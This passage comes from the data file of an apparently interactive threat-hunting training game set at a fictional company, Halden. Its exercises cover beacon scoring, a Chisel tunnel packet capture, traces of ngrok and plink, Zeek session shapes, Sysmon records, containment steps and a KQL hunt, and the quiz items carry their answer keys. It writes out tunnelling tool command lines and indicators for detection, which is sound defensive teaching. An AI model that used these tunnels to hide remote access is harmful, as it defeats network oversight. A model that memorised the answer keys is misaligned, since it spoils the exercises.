          { id: "n2", label: "HG-MKT-LT04 to webmail.haldengeo.example", bad: false, values: { spread: 1500, conns: 22 } },
          { id: "n3", label: "HG-ENG-WS06 to news.example", bad: false, values: { spread: 980, conns: 38 } },
          { id: "n4", label: "HG-OPS-ADM3 to chat.haldengeo.example", bad: false, values: { spread: 360, conns: 88 } },
          { id: "n5", label: "HG-FS-01 to sync.haldengeo.example (one burst)", bad: false, values: { spread: 30, conns: 14 } },
          { id: "n6", label: "HG-ENG-WS06 to drawings.haldengeo.example (page reload)", bad: false, values: { spread: 12, conns: 4 } },
          { id: "n7", label: "HG-KIOSK-02 to lic.mapcore.example", bad: false, values: { spread: 1, conns: 48 } },
        ],
        goal: { catch: 4, maxFalse: 1 },
        lesson: "Both dials do real work: spread throws out human timing, and repetition throws out short bursts. Set the spread from the slowest beacon you care about, because a limit that suits a five-minute sleep misses a thirty-minute one. The licence check still fires, because it really is on a timer. Timing can't clear it. Destination and process do that next.",
      },
    ],
    // ── Warm-up for the beacon hunt ──
    "tunnel-o1": [
      {
        kind: "trace",
        title: "From Gap to Owner",
        prompt: "Friday. Work the scored pairs from the same eight hours the way a hunt runs when no endpoint alert exists. Each table takes the result of the table before it, so read what you learned before you move on.",
        primer: {
          fold: true,
          title: "Rarity, and where the hunt leaves the network",
          points: [
            "**Rarity** asks how many hosts in the estate contact a destination, and since when. A service used by most of the fleet is rarely worth a morning.",
            "Proxy logs can't name a process. Once you have a host, you need endpoint telemetry.",
            "A timing result is a lead. A person with a reason, or no reason, closes it.",
          ],
          example: {
            label: "Worked example: two destinations",
            lines: [
              "updates.vendor.example: 212 hosts, seen for two years.",
              "q9x.example: 1 host, first seen yesterday.",
              "Timing could be identical. The second has earned the next step.",
            ],
          },
        },
        lead: "Eight hours of proxy logs. No alert, no host, no process yet.",
        steps: [
          {
            id: "score", ask: "The pairs are scored. Which one scores highest?", source: "Beacon scores · 8-hour window",
            columns: ["Host", "Destination", "Conns", "Gap avg (s)", "Gap stdev (s)", "Bytes stdev", "Score"],
            rows: [
              ["HG-OPS-ADM2", "wiki.haldengeo.example", "140", "205", "640", "9120", "0.12"],
              ["HG-HIST-02", "kilnmetrics.example", "96", "299", "35", "44", "0.94"],
              ["HG-ENG-WS06", "news.example", "38", "757", "980", "20400", "0.08"],
              ["HG-KIOSK-02", "lic.mapcore.example", "48", "600", "1", "12", "0.97"],
            ],
            answer: 3, why: "The top score is a perfect timer with steady bytes. A score says how machine-like a pair is, and it doesn't say whose machine.", learned: "Two pairs score above 0.9: lic.mapcore.example and kilnmetrics.example.",
          },
          {
            id: "rare", ask: "Now check both high scorers against the estate. Which destination is rare?", source: "Proxy logs · destination prevalence · 30 days",
            columns: ["Destination", "Hosts contacting it", "First seen", "Category"],
            rows: [
              ["lic.mapcore.example", "41", "2024-02-11", "Software licensing"],
              ["wiki.haldengeo.example", "212", "2021-06-03", "Internal"],
              ["kilnmetrics.example", "1", "2026-11-03", "Uncategorised"],
            ],
            answer: 2, why: "One host, first seen this week, in no category. The licence server drops out here: 41 hosts have used it for years.", learned: "Only HG-HIST-02 to kilnmetrics.example survives.",
          },
          {
            id: "owner", ask: "You have a host, so leave the proxy. Which process makes these connections?", source: "DeviceNetworkEvents · HG-HIST-02",
            columns: ["Timestamp", "RemoteUrl", "RemotePort", "InitiatingProcessFileName", "InitiatingProcessFolderPath"],
            rows: [
              ["11-06 08:02:11", "dc.haldengeo.example", "389", "lsass.exe", "C:\\Windows\\System32\\lsass.exe"],
              ["11-06 08:04:43", "kilnmetrics.example", "443", "msedgeupd.exe", "C:\\ProgramData\\EdgeCache\\msedgeupd.exe"],
              ["11-06 08:05:30", "backup.haldengeo.example", "8443", "backupagent.exe", "C:\\Program Files\\HaldenBackup\\backupagent.exe"],
              ["11-06 08:06:02", "kdc.haldengeo.example", "88", "svchost.exe", "C:\\Windows\\System32\\svchost.exe"],
            ],
            answer: 1, why: "The name imitates an updater, but the folder holds no browser. FolderPath gives you what to pull next.", learned: "msedgeupd.exe in C:\\ProgramData\\EdgeCache\\ owns the connections.",
          },
          {
            id: "reason", ask: "Before you escalate: does anyone own this? Which record answers that?", source: "Change calendar and asset owner replies · HG-HIST-02",
            columns: ["Record", "Owner", "Says"],
            rows: [
              ["Asset owner reply", "Plant systems", "No browser on this host. No software of that name deployed. Unverified."],
              ["CHG-20377", "K. Ferro", "Weekly report export. Names plink, not this file."],
              ["CHG-20402", "Plant systems", "Historian patching, closed 2026-10-28."],
            ],
            answer: 0, why: "A direct answer from the person who owns the host: nothing explains this file. Now it can be escalated with evidence, not just a timing plot.", learned: "No documented reason. Escalate HG-HIST-02.",
          },
        ],
      },
    ],
    // ── Reading 5: borrowed tools ──
    "tunnel-r5": [
      {
        kind: "pcap",
        title: "Inside the Upgrade",
        prompt: "A sensor by the engineering switch caught one HTTP connection from HG-ENG-WS06 to 198.51.100.62 that never seems to close. Someone says it's a chat app. Read the first packets, peel back each layer, and see what's actually in there.",
        primer: {
          fold: true,
          title: "How a tunnel hides in HTTP",
          points: [
            "**Chisel** is an open-source tunnel written in Go. Client and server are one small file, with nothing to install, and penetration testers use it as well as intruders.",
            "It starts as plain HTTP, asks to upgrade to **WebSocket**, then runs an SSH session inside the WebSocket. The tunnels, often a SOCKS proxy, run inside that.",
            "WebSocket upgrades are everywhere: chat and dashboards use them. `Sec-WebSocket-Protocol` names what the client intends to speak.",
            "Operators can change a default fingerprint, so a clean header clears nothing. Then behaviour leads: a new binary holding one long outbound connection.",
          ],
          example: {
            label: "Worked example: an ordinary upgrade",
            lines: [
              "GET /socket HTTP/1.1",
              "Upgrade: websocket",
              "Sec-WebSocket-Protocol: graphql-transport-ws",
              "HTTP/1.1 101 Switching Protocols",
              "Layer one, HTTP. Layer two, WebSocket. Layer three, a dashboard's live updates.",
            ],
          },
        },
        capture: "hg-eng-ws06-8080.pcapng",
        packets: [
          { no: 1, time: "0.000000", src: "10.60.3.31", dst: "198.51.100.62", proto: "TCP", len: 66, info: "49812 → 8080 [SYN] Seq=0 Win=64240 Len=0 MSS=1460", tree: ["Internet Protocol Version 4, Src: 10.60.3.31, Dst: 198.51.100.62", "Transmission Control Protocol, Src Port: 49812, Dst Port: 8080, Seq: 0, Len: 0"] },
          { no: 2, time: "0.038114", src: "198.51.100.62", dst: "10.60.3.31", proto: "TCP", len: 66, info: "8080 → 49812 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460", tree: ["Internet Protocol Version 4, Src: 198.51.100.62, Dst: 10.60.3.31", "Transmission Control Protocol, Src Port: 8080, Dst Port: 49812, Seq: 0, Ack: 1, Len: 0"] },
          { no: 3, time: "0.038301", src: "10.60.3.31", dst: "198.51.100.62", proto: "TCP", len: 54, info: "49812 → 8080 [ACK] Seq=1 Ack=1 Win=64240 Len=0", tree: ["Internet Protocol Version 4, Src: 10.60.3.31, Dst: 198.51.100.62", "Transmission Control Protocol, Src Port: 49812, Dst Port: 8080, Seq: 1, Ack: 1, Len: 0"] },
          { no: 4, time: "0.038790", src: "10.60.3.31", dst: "198.51.100.62", proto: "HTTP", len: 282, info: "GET / HTTP/1.1", tree: ["Internet Protocol Version 4, Src: 10.60.3.31, Dst: 198.51.100.62", "Transmission Control Protocol, Src Port: 49812, Dst Port: 8080, Seq: 1, Ack: 1, Len: 228", "Hypertext Transfer Protocol", "    Request Method: GET", "    Request URI: /", "    Upgrade: websocket"], data: "GET / HTTP/1.1\nHost: 198.51.100.62:8080\nUser-Agent: Go-http-client/1.1\nConnection: Upgrade\nSec-WebSocket-Key: q3Z7x1mVb0Ht6yLdN2sJfA==\nSec-WebSocket-Protocol: chisel-v3\nSec-WebSocket-Version: 13\nUpgrade: websocket" },
          { no: 5, time: "0.077204", src: "198.51.100.62", dst: "10.60.3.31", proto: "HTTP", len: 227, info: "HTTP/1.1 101 Switching Protocols", tree: ["Internet Protocol Version 4, Src: 198.51.100.62, Dst: 10.60.3.31", "Transmission Control Protocol, Src Port: 8080, Dst Port: 49812, Seq: 1, Ack: 229, Len: 173", "Hypertext Transfer Protocol", "    Status Code: 101", "    Response Phrase: Switching Protocols"], data: "HTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: f9Kz1eW3cR8uTnP0aXoY2hLmQ5s=\nSec-WebSocket-Protocol: chisel-v3" },
          { no: 6, time: "0.077655", src: "10.60.3.31", dst: "198.51.100.62", proto: "WebSocket", len: 82, info: "WebSocket Binary [FIN] [MASKED]", tree: ["Internet Protocol Version 4, Src: 10.60.3.31, Dst: 198.51.100.62", "Transmission Control Protocol, Src Port: 49812, Dst Port: 8080", "WebSocket", "    Opcode: Binary (2)", "    Mask: True", "    Unmasked payload shown below"], data: "SSH-chisel-v3-client" },
          { no: 7, time: "0.116020", src: "198.51.100.62", dst: "10.60.3.31", proto: "WebSocket", len: 78, info: "WebSocket Binary [FIN]", tree: ["Internet Protocol Version 4, Src: 198.51.100.62, Dst: 10.60.3.31", "Transmission Control Protocol, Src Port: 8080, Dst Port: 49812", "WebSocket", "    Opcode: Binary (2)", "    Mask: False"], data: "SSH-chisel-v3-server" },
          { no: 8, time: "0.116488", src: "10.60.3.31", dst: "198.51.100.62", proto: "WebSocket", len: 1138, info: "WebSocket Binary [FIN] [MASKED]", tree: ["Internet Protocol Version 4, Src: 10.60.3.31, Dst: 198.51.100.62", "Transmission Control Protocol, Src Port: 49812, Dst Port: 8080", "WebSocket", "    Opcode: Binary (2)", "    Mask: True"] },
          { no: 31, time: "412.604117", src: "198.51.100.62", dst: "10.60.3.31", proto: "WebSocket", len: 134, info: "WebSocket Binary [FIN]", tree: ["Internet Protocol Version 4, Src: 198.51.100.62, Dst: 10.60.3.31", "Transmission Control Protocol, Src Port: 8080, Dst Port: 49812", "WebSocket", "    Opcode: Binary (2)", "    Mask: False"] },
          { no: 1160, time: "14402.118340", src: "10.60.3.31", dst: "198.51.100.62", proto: "WebSocket", len: 134, info: "WebSocket Binary [FIN] [MASKED]", tree: ["Internet Protocol Version 4, Src: 10.60.3.31, Dst: 198.51.100.62", "Transmission Control Protocol, Src Port: 49812, Dst Port: 8080", "WebSocket", "    Opcode: Binary (2)", "    Mask: True"] },
        ],
        objectives: [
          { id: "sub", task: "Open packet 4. Which subprotocol does the client ask for?", hint: "http", answer: ["chisel-v3"], why: "A client naming its own tool in a header. That's the default build, and operators can change it, so a hit means something while a miss clears nothing." },
          { id: "status", task: "Which status code does the server answer with in packet 5?", hint: "http", answer: ["101"], why: "101 Switching Protocols: from here on, this TCP connection stops being HTTP. Any log that records only the request sees a single GET." },
          { id: "inner", task: "Read the first WebSocket payload. Which protocol's banner is inside it?", hint: "websocket", answer: ["ssh"], why: "SSH inside WebSocket inside HTTP. After the banners come the key exchange, and the payload goes dark." },
          { id: "port", task: "Which destination port does the firewall log for this connection?", hint: "tcp", answer: ["8080"], why: "As with any tunnel, the firewall records the outer connection only: port 8080 here, Chisel's default server port." },
          { id: "age", task: "Packet 1160 is still the same connection. Roughly how many hours has it been open? Give a whole number.", hint: "websocket", answer: ["4"], why: "14,402 seconds is four hours, and it's still going. A chat app can hold a WebSocket that long too, so duration alone settles nothing. The banners inside are what name this one." },
        ],
      },
      {
        kind: "sort",
        title: "Who Left This Trace?",
        prompt: "Jorge's notes from three weeks of network reviews, with the tool names cut off. Every line is a trace of one of three borrowed tools. Put each with its tool, and notice that none of them is proof of anything by itself.",
        primer: {
          fold: true,
          title: "Two more borrowed tools",
          points: [
            "**ngrok** is a developer service. The client dials out to the provider, and the provider hands back a public name that leads to a service on that host.",
            "**plink** is PuTTY's command-line client: a small, signed Windows binary used in admin scripts for decades, with the same forward flags as SSH.",
            "Intruders borrow these because security tools often trust them, and because plenty of real work uses them.",
            "So a tool's name is where a question starts. **Context**, **behaviour** and **correlation** answer it.",
          ],
          example: {
            label: "Worked example: naming a tool from one trace",
            lines: [
              "A new service binary, PSEXESVC.exe, appears on a server.",
              "That name belongs to PsExec, a signed admin tool.",
              "It tells you which tool ran. It doesn't tell you whose hands were on it.",
            ],
          },
        },
        buckets: [
          { id: "ngrok", label: "ngrok" },
          { id: "chisel", label: "Chisel" },
          { id: "plink", label: "plink" },
        ],
        items: [
          { id: "t1", text: "TLS SNI (the server name in the handshake) ending in .ngrok.io, from a host with no public address", bucket: "ngrok", why: "The SNI shows the provider's own domain. The session is genuine provider traffic, so what matters is which host is making it." },
          { id: "t2", text: "A web page on a laptop answers on a public HTTPS name, and no inbound rule exists anywhere", bucket: "ngrok", why: "The provider's edge takes the public side and passes it down the connection the client opened." },
          { id: "t3", text: "A single Go binary dropped in ProgramData, with no installer record", bucket: "chisel", why: "One portable file with no dependencies is how this tool arrives. Paths and names change, so behaviour counts for more than the file name." },
          { id: "t4", text: "An HTTP GET that upgrades to WebSocket, then one connection held for hours", bucket: "chisel", why: "A tunnel carried over HTTP. The upgrade itself is normal. The hours, and the binary behind them, are the point." },
          { id: "t5", text: "A SOCKS port opens on a remote server soon after one small file runs on a workstation", bucket: "chisel", why: "Its reverse mode can open a SOCKS listener on the server's side, with no SSH credentials or SSH server needed on the victim." },
          { id: "t6", text: "A signed PuTTY binary launched with -ssh -N and a forward spec", bucket: "plink", why: "-ssh picks the protocol and -N skips the shell. That combination exists to script a forward." },
          { id: "t7", text: "A scheduled task that has called the same PuTTY client from the admin toolkit share since 2019", bucket: "plink", why: "Years of history in a toolkit path: the everyday use that keeps this binary on allowlists." },
          { id: "t8", text: "A saved SSH host key appears under PuTTY's SshHostKeys registry entry for a service account", bucket: "plink", why: "PuTTY tools cache each server's key per user. A new entry records a first connection to that server by that account." },
        ],
      },
    ],
    // ── Warm-up for the host-role question ──
    "tunnel-q3": [
      {
        kind: "sort",
        title: "Same Destination, Different Host",
        prompt: "Legal asks why Jorge flagged a consumer file-sync service that half the office uses. Every row below goes to the same place, syncbox.example, so the destination can't be what decides. Sort each by whether the host's job explains it.",
        primer: {
          fold: true,
          title: "Start from the host",
          points: [
            "Every server has a job, and that job describes who it should talk to.",
            "Compare the connection with that job before you think about the far end.",
            "Change records and the asset inventory tell you what a host is for.",
          ],
          example: {
            label: "Worked example: a print server",
            lines: [
              "It reaches Windows Update every week: keeping it patched is part of running it.",
              "It opens a video site at 03:00: no print job explains that.",
            ],
          },
        },
        buckets: [
          { id: "fits", label: "The host's job explains it" },
          { id: "ask", label: "Nothing about this host explains it" },
        ],
        items: [
          { id: "h1", text: "HG-MKT-LT04, marketing laptop, uploading trade-show photos", bucket: "fits", why: "A user laptop, a person, and a task that fits the department." },
          { id: "h2", text: "HG-HIST-02, plant historian, its first connection ever to this service", bucket: "ask", why: "A historian collects plant data and serves it internally. No job on this host involves consumer storage." },
          { id: "h3", text: "HG-FIELD-LT02, site engineer's laptop, syncing a contractor's drawings", bucket: "fits", why: "A named contractor exchange on a field laptop: the context supplies the reason." },
          { id: "h4", text: "HG-DC-01, domain controller, 40 MB outbound", bucket: "ask", why: "A domain controller answers sign-ins and directory queries. Nobody browses from it, and it has no reason to sync files anywhere." },
          { id: "h5", text: "HG-RECEP-01, reception PC, sync client installed by IT for visitor forms", bucket: "fits", why: "IT installed it for a stated purpose, so there's a record to check." },
          { id: "h6", text: "HG-WELL-GW3, well-field gateway, overnight", bucket: "ask", why: "A gateway bridges well sensors to the plant. Its documented traffic has no internet leg at all." },
          { id: "h7", text: "HG-FS-01, payroll file server, a nightly upload", bucket: "ask", why: "Regular doesn't mean explained: backups go to HG-BKP-01, not to a consumer service." },
        ],
      },
    ],
    // ── Reading 6: the playbook ──
    "tunnel-r6": [
      {
        kind: "spotdiff",
        title: "Two Sessions, One Port",
        prompt: "Karin Ferro killed the ssh processes on the gateway on Tuesday, which closed the quiet wire, and Zeek, the network sensor at the plant edge, wrote its record. Jorge lays it beside Karin Ferro's maintenance session on the same gateway. Both are SSH on port 22, both logged in once. Tap the lines where the two sessions really behave differently.",
        hud: "Tap the lines that show a different shape",
        sameLine: "That line is the same in both sessions.",
        winTitle: "Every shape difference found",
        howTo: [
          "Compare the two records line by line.",
          "Tap each line where the session's behaviour differs.",
          "A different value isn't always a different behaviour, and a wrong tap costs a life.",
        ],
        primer: {
          fold: true,
          title: "What a session's shape shows",
          points: [
            "An interactive session is short and bursty. A person types, the server answers, and far more comes down than goes up.",
            "A held-open tunnel can run for days. When idle it carries keepalives: small packets on a steady timer, about the same size each way.",
            "Zeek's `conn.log` holds duration and bytes, and `ssh.log` holds banners and ciphers. A `conn.log` line appears only when the connection ends, so a long session can stay invisible while it's open.",
            "The `enrichment` lines aren't Zeek fields. An analyst worked them out from the packets and the fleet's flow records.",
            "Shape suggests how a session is being used. The mode and direction of a forward stay hidden, so the command line still matters.",
          ],
          example: {
            label: "Worked example: a third shape",
            lines: [
              "SFTP backup: duration 640 s, orig_bytes 2.1 GB, resp_bytes 1.4 MB.",
              "Heavily one-way, with no typing rhythm: a bulk upload.",
              "Neither interactive nor idle. Each use of SSH has its own shape.",
            ],
          },
        },
        goodTitle: "Karin's session, HG-JUMP-01 to HG-WELL-GW3",
        suspectTitle: "The quiet wire, HG-WELL-GW3 to 203.0.113.58",
        good: [
          "service                      ssh",
          "id.resp_p                    22",
          "conn_state                   SF",
          "duration                     1094.31",
          "orig_bytes                   11204",
          "resp_bytes                   88316",
          "auth_attempts                1",
          "client                       SSH-2.0-OpenSSH_9.6",
          "cipher_alg                   aes256-gcm@openssh.com",
          "kex_alg                      curve25519-sha256",
          "enrichment.median_pkt_gap_s   0.6",
          "enrichment.hosts_to_dest_90d  6",
        ],
        suspect: [
          "service                      ssh",
          "id.resp_p                    22",
          "conn_state                   SF",
          "duration                     343112.70",
          "orig_bytes                   549184",
          "resp_bytes                   530116",
          "auth_attempts                1",
          "client                       SSH-2.0-OpenSSH_9.6",
          "cipher_alg                   chacha20-poly1305@openssh.com",
          "kex_alg                      curve25519-sha256",
          "enrichment.median_pkt_gap_s   45.0",
          "enrichment.hosts_to_dest_90d  1",
        ],
        diffs: [
          { line: 3, why: "Eighteen minutes against 95 hours. A person finishes a job and logs out. A session held for four days has something keeping it alive." },
          { line: 4, why: "Karin's upstream is keystrokes, about an eighth of what came back. Here upstream nearly equals downstream, which is what keepalives look like: small, equal, both ways." },
          { line: 10, why: "A typing session moves in bursts, under a second apart. A steady 45 seconds is a timer, here a keepalive setting holding the session open." },
          { line: 11, why: "Six admin hosts reach the gateway over SSH. One host in the estate has ever talked to this destination. Rarity is a property of the whole estate, not of this flow." },
        ],
        decoys: [
          { line: 5, why: "Ninety-five hours of anything moves more bytes than eighteen minutes. The total says little. What it means depends on the line above it." },
          { line: 8, why: "Two supported ciphers. Clients pick them by version and configuration, and either is normal." },
        ],
        lesson: "Read a session's shape in four parts: how long it ran, which way the bytes lean, how steady the packets are, and how many hosts share the destination. That tells you what to ask next. It never says which forward was used. For that you go to the command line, which is where this investigation started on Monday.",
      },
      {
        kind: "anatomy",
        title: "Anatomy of a Verify Record",
        prompt: "The playbook's last step is a person, not a query. This is the case record for the weekly report export you saw on Monday. Read what the rule caught, and what the owner's answer adds.",
        source: "SIEM case record · HG-CASE-2291",
        fields: [
          { key: "rule.name", value: "Long-lived SSH session from a Windows host", label: "What fired" },
          { key: "hostname", value: "HG-OPS-ADM3.haldengeo.example" },
          { key: "process.cmdline", value: "plink -ssh -N -P 8022 -L 9443:10.60.4.15:443 -l svc-rpt 10.60.1.10", label: "What ran", note: "Step 1 of the playbook: the full command line, with mode and ports." },
          { key: "destination", value: "10.60.1.10:8022", note: "Step 2: an internal jump host, used by this account every week for two years." },
          { key: "session_duration_seconds", value: "39720", note: "Step 3: 11 hours and 2 minutes." },
          { key: "change_ticket", value: "CHG-20377", label: "Paper trail", note: "A ticket number is a pointer. The owner's answer below is what says the ticket covers this activity." },
          { key: "it_verify_result", value: "confirmed", label: "Owner's answer", note: "This records what the asset or change owner said. confirmed: a documented reason exists. unverified: no owner or ticket backs the activity." },
          { key: "it_verify_message", value: "Weekly historian report export. Host, account and destination match CHG-20377. K. Ferro.", note: "The detail worth reading: what exactly was checked, and against what." },
        ],
        summary: "The six steps run in order: command line, destination rarity, duration and bytes, DNS and TLS metadata, what else happened on that host and account, then the owner. Skipping the last one fails in both directions. Escalating every dual-use tool buries the team, and waving them all through lets the rare bad run walk past.",
      },
    ],
    // ── Warm-up for Log Analysis 1 ──
    "tunnel-la1": [
      {
        kind: "anatomy",
        title: "Anatomy of a Signed Launch",
        prompt: "A launch record tells you a lot and leaves out more. Read the record behind the report export from Monday's table, field by field, before you take a colleague's case.",
        source: "Sysmon Event ID 1, with Event ID 7 · HG-OPS-ADM3",
        fields: [
          { key: "UtcTime", value: "2026-11-01 20:58:03.114", label: "When" },
          { key: "Image", value: "C:\\Tools\\PuTTY\\plink.exe", label: "What ran", note: "The full path of the file. The same name can sit in many folders." },
          { key: "CommandLine", value: "plink -ssh -N -P 8022 -L 9443:10.60.4.15:443 -l svc-rpt -i C:\\Tools\\keys\\rpt.ppk 10.60.1.10", note: "-P is the SSH server's port. The spec after -L is the forward. -i is a key file, -l the login name." },
          { key: "CurrentDirectory", value: "C:\\Tools\\PuTTY\\", note: "Where the process was started from." },
          { key: "User", value: "HALDEN\\svc-rpt", label: "As whom", note: "The account that ran it. Compare with what this account normally runs." },
          { key: "ParentImage", value: "C:\\Windows\\System32\\svchost.exe", label: "Started by" },
          { key: "ParentCommandLine", value: "svchost.exe -k netsvcs -p -s Schedule", note: "The Task Scheduler service: this launch came from a scheduled task." },
          { key: "IntegrityLevel", value: "Medium", note: "The token level the process runs at." },
          { key: "Signed", value: "true", label: "Image load", note: "From Event ID 7 or the EDR, not from Event ID 1." },
          { key: "SignatureStatus", value: "Valid", note: "This file carries its publisher's signature and hasn't changed since. The value travels with the file, wherever it's copied." },
        ],
        summary: "A launch record answers what ran, from where, as whom, started by what, with which arguments. Signature fields belong to the file, so they read the same on every host it lands on. Earlier history and session length aren't in this record at all: the SIEM joins those in from process history and the firewall.",
      },
      {
        kind: "simulate",
        title: "Stack the Facts",
        prompt: "Three tool runs from last quarter's reviews. Put each through the same three questions and watch what one answer is worth, and what three together are worth.",
        primer: {
          fold: true,
          title: "One fact at a time, then together",
          points: [
            "Most single facts about a tool run have a dull explanation.",
            "Ask how many separate explanations the case needs. One story that covers everything is stronger than three coincidences.",
            "Stacking facts decides how urgently you ask the owner. It doesn't replace asking.",
          ],
          example: {
            label: "Worked example: a badge log",
            lines: [
              "A badge used at 03:00: night shift exists.",
              "A badge used at a door that person never uses: people cover for each other.",
              "Both at once, on a day they're on leave: one story fits all three, and it's a different story.",
            ],
          },
        },
        checks: [
          { name: "Account's habit", question: "Has this account run it before?" },
          { name: "Timing", question: "Is it inside a maintenance window?" },
          { name: "Destination", question: "Is the destination on the host's documented list?" },
        ],
        scenarios: [
          {
            id: "robocopy",
            label: "robocopy on HG-ENG-WS06",
            detail: "adm-k.ferro, who runs it every week, copies drawings to HG-FS-01 at 16:20 on a Wednesday. The window is Saturday.",
            results: ["pass", "fail", "pass"],
            why: ["A weekly habit for this account.", "Wednesday afternoon, three days from the window.", "HG-FS-01 is this workstation's listed file server."],
            verdict: "One miss, on a routine copy to a known share.",
          },
          {
            id: "scp",
            label: "scp on HG-OPS-ADM2",
            detail: "svc-rpt has never used scp. It runs during Saturday's planned window, to HG-BKP-01.",
            results: ["fail", "pass", "pass"],
            why: ["New for this account.", "Inside the planned window.", "HG-BKP-01 is on the host's list."],
            verdict: "One miss, with the window and the destination both in order.",
          },
          {
            id: "rclone",
            label: "rclone on HG-FS-01",
            detail: "svc-print runs it at 02:40 on a Tuesday, sending to 198.51.100.171.",
            results: ["fail", "fail", "fail"],
            why: ["A print account has no history with it.", "Nothing is scheduled at 02:40.", "That address is on no list for this host."],
            verdict: "No single line here is damning. Three misses need three separate excuses, so this is the row that goes to the owner first.",
          },
        ],
      },
    ],
    // ── Boss: Log Analysis 2 ──
    "tunnel-la2": [
      {
        kind: "sort",
        title: "Who Owns the Socket?",
        prompt: "A proxy record has no process field, so the SIEM joins EDR network events to it. Jorge pulled the owners of eight outbound connections from around the plant. Sort each by what that owner means for the case.",
        primer: {
          fold: true,
          title: "The proxy sees the connection, EDR sees the owner",
          points: [
            "A web proxy records host, destination, bytes and times. It has no process field.",
            "EDR network events do, as `InitiatingProcessFileName`. A SIEM joins the two on host, time and destination.",
            "The owner is the process holding the socket, so EDR names whichever program actually made the call.",
            "Ask what that process is for, and whether this connection is part of that.",
          ],
          example: {
            label: "Worked example: two desktop programs",
            lines: [
              "`OUTLOOK.EXE` connects to the mail service: its everyday job.",
              "`notepad.exe` connects to an address on the internet: a text editor has no network job.",
            ],
          },
        },
        buckets: [
          { id: "job", label: "A program doing its own job" },
          { id: "dropped", label: "A separate program placed on the host" },
          { id: "inside", label: "Code running inside a server process" },
        ],
        items: [
          { id: "o1", text: "MsMpEng.exe, every Windows host, to Microsoft definition updates", bucket: "job", why: "The antivirus engine fetching signatures, across the fleet, from where it always does." },
          { id: "o2", text: "backupagent.exe from Program Files, nightly, to HG-BKP-01", bucket: "job", why: "Installed path, internal destination, a schedule that matches the backup plan." },
          { id: "o3", text: "Microsoft.Management.Services.IntuneWindowsAgent.exe, all managed laptops, to the management service", bucket: "job", why: "The management agent checking in, the same way everywhere." },
          { id: "o4", text: "msedgeupd.exe from C:\\ProgramData\\EdgeCache\\ to kilnmetrics.example", bucket: "dropped", why: "A name built to look routine, in a folder no installer owns, on a host with no browser." },
          { id: "o5", text: "svcutil64.exe from C:\\Users\\Public\\ to 198.51.100.62", bucket: "dropped", why: "A system-sounding name in a world-writable folder. Someone or something put this file here." },
          { id: "o6", text: "w3wp.exe on HG-WEB-05, every 240 seconds, to a host no other server contacts", bucket: "inside", why: "An IIS worker exists to answer web requests. A timed outbound session from it means code is running in the application pool, and a web shell is the usual way in." },
          { id: "o7", text: "java.exe running the plant reporting portal, on a steady timer, to a rare address", bucket: "inside", why: "The portal's own process holds the socket, so the question moves to what got loaded into that application." },
          { id: "o8", text: "node.exe running the vendor dashboard, one long connection to an unlisted address", bucket: "inside", why: "Same logic: a runtime hosting a known application is making a call that application doesn't make." },
        ],
      },
      {
        kind: "sequence",
        title: "First Hour on a Beaconing Host",
        prompt: "HG-HIST-02 has a dropped implant calling out, and the plant can't lose its historian for long. Jorge wants the first hour in order. Tap the steps in the order you'd run them.",
        primer: {
          fold: true,
          title: "Containment that keeps the evidence",
          points: [
            "**Network containment** cuts a host off from everything except the EDR service. The machine stays on, and you can still work on it.",
            "Memory holds running code, keys and live connections, and it's gone at power-off. Collect it while the host is up.",
            "A block at the edge protects every other host while you work on the first.",
            "After that, work outward (who else) and backward (how it got in).",
          ],
          example: {
            label: "Worked example: a leaking brine line",
            lines: [
              "Close the valves either side of the leak, and leave the line where it is.",
              "Photograph the joint before anyone touches it.",
              "Check the sister line, then work out why the joint failed.",
            ],
          },
        },
        items: [
          { id: "hunt", text: "Search the estate for the same file hash and destination", note: "Outward: one implant is rarely alone." },
          { id: "data", text: "Work out which historian data the implant could reach", note: "Last, because it depends on knowing how and when it got in." },
          { id: "contain", text: "Put HG-HIST-02 in EDR network containment, powered on", note: "First: the channel stops, and the machine keeps its state." },
          { id: "root", text: "Trace how msedgeupd.exe got onto the host", note: "Backward: the way in may still be open." },
          { id: "block", text: "Block kilnmetrics.example and its address at the egress firewall", note: "Now no other host can use the same channel while you investigate." },
          { id: "memory", text: "Capture memory and the live connection table", note: "Contained, still running: the volatile evidence is intact." },
        ],
        order: ["contain", "memory", "block", "hunt", "root", "data"],
        doneNote: "Stop the channel without losing the machine, secure what's volatile, protect the other hosts, then ask who else, how it got in, and what it touched. Each step keeps the next one possible.",
      },
    ],
    // ── Boss: write the hunt ──
    "tunnel-qf1": [
      {
        kind: "inspect",
        title: "Read a Hunt Line by Line",
        prompt: "Before you write your own, read one of Jorge's. This hunt has nothing to do with the network: it looks for accounts that sign in on a clock, which usually means a script. Tap each line to see what it does.",
        primer: {
          fold: true,
          title: "Reading KQL from the top down",
          points: [
            "KQL, the Kusto Query Language, is what Microsoft's hunting consoles use. A query is a pipeline: each `|` takes the rows from the line above.",
            "`summarize ... by` collapses rows to one per group, using aggregations such as `count()` and `avg()`.",
            "`prev()` reads a column from the row above, so the rows must be sorted first.",
          ],
          example: {
            label: "Worked example: a short pipeline",
            lines: [
              "`DeviceProcessEvents`",
              "`| summarize Runs = count() by FileName`",
              "`| where Runs > 100`",
              "One row per file name. `>` is strict, so exactly 100 runs is dropped.",
            ],
          },
        },
        artifact: "Advanced hunting · scripted-logon hunt",
        items: [
          { id: "l1", text: "DeviceLogonEvents", tag: "Table", tone: "info", note: "One row per sign-in on a device." },
          { id: "l2", text: "| where Timestamp > ago(7d)", tag: "Window", tone: "info", note: "Seven days: long enough for a daily or hourly job to repeat." },
          { id: "l3", text: "| where ActionType == \"LogonSuccess\"", tag: "Filter", tone: "info", note: "Successful sign-ins only." },
          { id: "l4", text: "| sort by AccountName asc, DeviceName asc, Timestamp asc", tag: "Order", tone: "info", note: "Groups each account and device together, oldest first. prev() needs this." },
          { id: "l5", text: "| extend Gap = iff(AccountName == prev(AccountName) and DeviceName == prev(DeviceName), datetime_diff('minute', Timestamp, prev(Timestamp)), long(null))", tag: "Gap", tone: "info", note: "Minutes since the row above, but only within the same account and device. The first row of each pair gets null, so no gap is measured across two pairs." },
          { id: "l6", text: "| summarize Logons = count(), AvgGap = avg(Gap), GapSpread = stdev(Gap) by AccountName, DeviceName", tag: "Aggregate", tone: "info", note: "One row per pair. stdev() is KQL's standard deviation aggregation (stdevp() is the population form). AvgGap sits beside it for reading, but the filter below uses the spread." },
